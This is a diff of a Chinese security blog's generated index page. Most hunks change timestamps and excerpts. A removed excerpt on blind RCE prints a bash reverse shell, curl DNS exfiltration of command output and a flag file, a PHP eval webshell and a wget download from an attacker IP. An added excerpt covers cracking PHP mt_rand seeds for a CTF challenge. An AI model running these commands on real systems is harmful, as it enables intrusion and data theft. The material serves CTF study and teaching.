@@ -602,7 +602,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-03-31 16:39:40" itemprop="dateModified" datetime="2025-03-31T16:39:40+08:00">2025-03-31</time>
+                <time title="修改时间：2025-10-16 21:01:27" itemprop="dateModified" datetime="2025-10-16T21:01:27+08:00">2025-10-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -639,7 +639,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>复现的第一个IOT漏洞，算是比较经典的了，网上也有挺多相关的文章。这个漏洞从我复现完到现在有一段时间了，前段时间一直在忙其他事，现在来大致整理一下复现的整个过程，也算是过一个流程吧。</p>
+          <p>复现的第一个IOT漏洞，算是比较经典的了，网上也有挺多相关的文章。这个漏洞从我复现完到现在有一段时间了，前段时间一直在忙其他事，现在来大致整理一下复现的整个过程，也算是过一个流程。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2025/03/28/DIR-815%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more" rel="contents">
@@ -792,7 +792,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-10-16 20:00:05" itemprop="dateModified" datetime="2025-10-16T20:00:05+08:00">2025-10-16</time>
+                <time title="修改时间：2025-10-16 20:54:17" itemprop="dateModified" datetime="2025-10-16T20:54:17+08:00">2025-10-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -810,7 +810,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>948</span>
+              <span>1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -829,47 +829,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <span id="more"></span>
-
-<h2 id="什么是无回显RCE？"><a href="#什么是无回显RCE？" class="headerlink" title="什么是无回显RCE？"></a>什么是无回显RCE？</h2><p>无回显RCE，简单来说就是没有任何回显，不管命令或代码是否执行成功。这样的命令执行函数有exec()、shell_exec()。</p>
-<h2 id="判断是否执行成功"><a href="#判断是否执行成功" class="headerlink" title="判断是否执行成功"></a>判断是否执行成功</h2><ol>
-<li><p>延时：</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">windows</span>：whoami&amp;&amp;ping -n <span class="number">5</span> <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Linux</span>：whoami&amp;&amp;sleep <span class="number">5</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>目标服务器向个人的公网服务器<strong>发起http请求</strong>，当该公网服务器收到http请求就代表命令有执行</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">6666</span></span><br><span class="line"><span class="attribute">curl</span> 公网服务器IP:端口号</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="tee命令"><a href="#tee命令" class="headerlink" title="tee命令"></a>tee命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> | <span class="built_in">tee</span> a <span class="comment">#将ls的结果输入文件a中</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="dnslog-cn外带"><a href="#dnslog-cn外带" class="headerlink" title="dnslog.cn外带"></a><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">dnslog.cn</a>外带</h3><ol>
-<li>适用Linux</li>
-<li>命令用反引号包裹</li>
-<li>命令中不能有空格</li>
-</ol>
-<p>示例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl `<span class="built_in">whoami</span>`.lc52y4.dnslog.cn</span><br><span class="line">curl `<span class="built_in">cat</span> flag|sed s/[[:space:]]//`.lc52y4.dnslog.cn</span><br></pre></td></tr></table></figure>
-
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">6666</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/服务器IP/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="直接写入或外部下载webshell"><a href="#直接写入或外部下载webshell" class="headerlink" title="直接写入或外部下载webshell"></a>直接写入或外部下载webshell</h3><ol>
-<li><p>直接写入，需要站点目录具有写权限：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span> &gt; exp.php</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>外部下载，目标服务器可以连接外网且与攻击机互通：</p>
-<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">wget 攻击机IP <span class="punctuation">-</span>o <span class="built_in">exp</span>.php</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="各种命令执行"><a href="#各种命令执行" class="headerlink" title="各种命令执行"></a>各种命令执行</h3><p><strong>前提：目标服务器上要有已知可读文件，站点目录具有写权限</strong></p>
-<p>通过执行命令，直接将php文件写入到在浏览器可直接读取的文件类型中(如txt文件)，然后访问txt文件即可得到php文件内容。</p>
-<ol>
-<li><p>cp和mv和重定向</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> flag.php 1.txt</span><br><span class="line"><span class="built_in">mv</span> flag.php 1.txt</span><br><span class="line"><span class="built_in">cat</span> flag.php &gt; 1.txt</span><br><span class="line"><span class="built_in">cat</span> flag.php &gt;&gt; 1.txt</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>tar和zip</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar cvf flag.tar flag.php  <span class="comment"># 打包flag.php为flag.tar</span></span><br><span class="line">tar zcvf flag.tar.gz flag.php  <span class="comment"># 压缩flag.php为flag.tar.gz</span></span><br><span class="line"><span class="comment"># 解压缩：tar zxvf flag.tar.gz</span></span><br><span class="line">zip flag.zip flag.php</span><br><span class="line"><span class="comment">#解压缩：unzip flag.zip</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kinyoobi/p/15415869.html">无回显的渗透技巧 - kinyoobi - 博客园</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15406672.html">RCE篇之无回显rce - 学安全的小白 - 博客园</a></p>
-
+          <p>本文主要记录了<strong>无回显RCE</strong>相关的一些攻击手段，如使用延时、HTTP请求、<code>tee</code>命令、DNS日志外带、反弹shell以及直接写入或下载webshell等方法。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/03/03/%E6%97%A0%E5%9B%9E%E6%98%BERCE/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1014,7 +982,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-05-10 20:22:55" itemprop="dateModified" datetime="2025-05-10T20:22:55+08:00">2025-05-10</time>
+                <time title="修改时间：2025-10-16 20:46:25" itemprop="dateModified" datetime="2025-10-16T20:46:25+08:00">2025-10-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1051,7 +1019,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>[TOC]</p>
+          <p>本人记录了如何利用日志文件和 <code>pearcmd.php</code> 进行裸文件包含进行攻击</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2025/02/08/%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#more" rel="contents">
@@ -1109,7 +1077,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-04-27 23:21:40" itemprop="dateModified" datetime="2025-04-27T23:21:40+08:00">2025-04-27</time>
+                <time title="修改时间：2025-10-16 21:14:30" itemprop="dateModified" datetime="2025-10-16T21:14:30+08:00">2025-10-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1127,7 +1095,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>907</span>
+              <span>937</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -1146,16 +1114,25 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="mt-srand-和mt-rand"><a href="#mt-srand-和mt-rand" class="headerlink" title="mt_srand()和mt_rand()"></a>mt_srand()和mt_rand()</h2><p>mt_srand()函数用于设置Mersenne Twister随机数生成器的种子值，mt_rand()函数会依据种子生成伪随机数。下面是一个示例：</p>
+          <p>本文记录了php中<code>mt_rand()</code>函数漏洞的原理及相关利用</p>
+<h2 id="mt-srand-和mt-rand"><a href="#mt-srand-和mt-rand" class="headerlink" title="mt_srand()和mt_rand()"></a>mt_srand()和mt_rand()</h2><p>mt_srand()函数用于设置Mersenne Twister随机数生成器的种子值，mt_rand()函数会依据种子生成伪随机数。下面是一个示例：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&#x27;   &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&#x27;   &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&#x27;   &#x27;</span>;</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/02/07/mt-rand-%E6%BC%8F%E6%B4%9E/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+
+<p>运行上述代码，<strong>会发现三个结果不一样，但是每次运行得到的结果都不变</strong>。其实是因为mt_srand(seed)中的seed是确定的，故而同次序下mt_rand()每次生成的随机数一样。</p>
+<p>这样也就产生了漏洞：由其中一个随机数，去得到seed，然后就能预测其他随机数。</p>
+<h2 id="php-mt-seed"><a href="#php-mt-seed" class="headerlink" title="php_mt_seed"></a>php_mt_seed</h2><p><a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">下载地址</a></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272318982.png" alt="image-20250207213933475"></p>
+<p>直接下载压缩包到kali中，然后执行下面命令即可。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar zxvf php_mt_seed-4.0.tar.gz</span><br><span class="line">make   <span class="comment">#初始化，获得一个文件php_mt_seed</span></span><br><span class="line"><span class="built_in">chmod</span> 777 php_mt_seed   <span class="comment">#添加权限</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;seed.php&quot;</span>);</span><br><span class="line"><span class="comment">//mt_srand(*********);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&#123;0aa9ccfe-dfc6-4c0b-954d-dd55e41194db&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No Hacker!&quot;</span>;</span><br><span class="line">&#125; Hint: <span class="number">1219893521</span></span><br></pre></td></tr></table></figure>
+
+<p>分析代码可知，已知一个随机数为 1219893521，如果能知道第二个随机数的值便能获得flag。</p>
+<p>既然知道其中一个随机数了，便能利用php_mt_seed工具爆破seed，如图：</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272319041.png" alt="image-20250207220635329"></p>
+<p>得到不同版本php的seed，利用Wappalyzer插件获取题目中的php版本。</p>
+
       
     </div>
 
@@ -1249,7 +1226,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-count">59</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1298,12 +1275,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">284k</span>
+    <span title="站点总字数">280k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:18</span>
+    <span title="站点阅读时长">4:15</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
   </div>
